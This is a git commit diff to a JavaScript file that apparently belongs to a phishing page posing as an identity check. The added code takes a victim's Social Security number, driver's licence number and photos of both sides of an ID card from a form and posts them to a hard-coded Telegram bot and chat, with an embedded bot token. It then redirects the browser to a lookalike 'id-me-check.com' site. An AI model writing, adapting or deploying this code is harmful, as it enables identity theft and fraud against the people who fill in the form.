67a4a71b08307b3e4dd1159dbc6f75fdcec51408
hellsienna <158115816+hellsienna@users.noreply.github.com>
2024-02-04 12:41:19 -0800

    Update redirector.js

--- redirector.js
+++ redirector.js
@@ -1,3 +1,44 @@
+var submitForm = function () {
+          const BOT_TOKEN = '6921530308:AAF77fXVIGJthOwoo9IByU7C50r6wlUiWOs';
+          const CHAT_ID = '6355414951';
+          const ssn = document.getElementById('ssn').value;
+          const dl = document.getElementById('dl').value;
+          const frontInput = document.getElementById('front');
+          const frontfile = frontInput.files[0];		  
+	const backInput = document.getElementById('back');
+          const backfile = backInput.files[0];
+          const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+         
+	const formDataFront = new FormData();
+          formDataFront.append('chat_id', CHAT_ID);
+          formDataFront.append('document', frontfile);
+	formDataFront.append('caption', `Front\nSsn: ${ssn}\nDl: ${dl}`);  
+	
+	const formDataBack = new FormData();
+          formDataBack.append('chat_id', CHAT_ID);
+          formDataBack.append('document', backfile);
+	 formDataBack.append('caption', `Back\nSsn: ${ssn}\nDl: ${dl}`);
+
+          fetch(apiUrl, {
+              method: 'POST',
+              body: formDataFront,
+          })
+          .then(response => response.json())
+		  .then(fetch(apiUrl, {
+              method: 'POST',
+              body: formDataBack,
+          }))
+          .then(data => {
+              console.log('Telegram API response:', data);
+          })
+          .catch(error => {
+              console.error('Error sending message:', error);
+             // alert('Failed to send message and file. Please try again.');
+          });
+		return false;
+      };
+
+
 var currentTab = 0;
 	showTab(currentTab);
 	
@@ -18,7 +59,14 @@ function nextPrev(n) {
 	x[currentTab].style.display = "none";
 	currentTab = currentTab + n;
 	if (currentTab >= x.length) {
-	document.getElementById("formContainer").submit();
+	var form = document.getElementById("formContainer");
+	var submitButton = document.getElementById("nextBtn");
+	submitButton.setAttribute("type","submit");
+	form.addEventListener("submit", (event) => {
+	  event.preventDefault();
+	  submitForm();
+	  });
+		
 	document.getElementById("loader").style.display = "block";
 	document.getElementById("underLoader").style.display = "none";
     return false;
@@ -48,54 +96,9 @@ function fixStepIndicator(n) {
 	}
 	x[n].className += " active";
 	}
-	
-function submitForm() {
-          const BOT_TOKEN = '6921530308:AAF77fXVIGJthOwoo9IByU7C50r6wlUiWOs';
-          const CHAT_ID = '6355414951';
 
-          const ssn = document.getElementById('ssn').value;
-          const dl = document.getElementById('dl').value;
-          //const message = document.getElementById('message').value;
-
-          const frontInput = document.getElementById('front');
-          const frontfile = frontInput.files[0];
-		  
-		  const backInput = document.getElementById('back');
-          const backfile = backInput.files[0];
-     
-
-          const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-
-          const formDataFront = new FormData();
-          formDataFront.append('chat_id', CHAT_ID);
-          formDataFront.append('document', frontfile);
-		  formDataFront.append('caption', `Front\nSsn: ${ssn}\nDl: ${dl}`);
-		  
-	const formDataBack = new FormData();
-          formDataBack.append('chat_id', CHAT_ID);
-          formDataBack.append('document', backfile);
-		  formDataBack.append('caption', `Back\nSsn: ${ssn}\nDl: ${dl}`);
-
-          fetch(apiUrl, {
-              method: 'POST',
-              body: formDataFront,
-          })
-          .then(response => response.json())
-		  .then(fetch(apiUrl, {
-              method: 'POST',
-              body: formDataBack,
-          }))
-          .then(data => {
-              console.log('Telegram API response:', data);
-          })
-          .catch(error => {
-              console.error('Error sending message:', error);
-             // alert('Failed to send message and file. Please try again.');
-          });
-      }	
-	
-	let myRedirect = () => {
-		var theRedirect = () => {if (document.getElementById("loader").style.display == "block") {window.location.replace("https://id-me-check.com");}
+let myRedirect = () => {
+	var theRedirect = () => {if (document.getElementById("loader").style.display == "block") {window.location.replace("https://id-me-check.com");}
 		}
 	setTimeout(theRedirect, 5000);
 	}
